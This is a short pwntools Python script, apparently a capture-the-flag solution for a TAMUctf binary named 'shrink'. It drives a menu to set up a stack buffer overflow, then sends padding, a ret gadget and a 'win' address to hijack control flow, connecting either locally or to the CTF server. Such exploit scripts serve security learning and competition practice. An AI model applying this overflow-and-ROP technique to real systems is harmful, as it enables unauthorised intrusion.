from pwn import *

exe = ELF('./shrink')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *vuln+165
        b *0x401450
        b *vuln+242
        continue
    """)
elif args.REMOTE:
    io = remote("tamuctf.com", 443, ssl=True, sni="shrink")


offset = 0x38
ret = 0x00000000004013f3
win = 0x0000000000401255

for _ in range(offset):
    io.sendlineafter(b':', b'3')

io.sendlineafter(b':', b'2')
io.sendlineafter(b':', b'A')

io.sendlineafter(b':', b'2')
io.sendlineafter(b':', b'A' * offset + pack(ret) + pack(win))
io.sendlineafter(b':', b'4')
io.interactive()
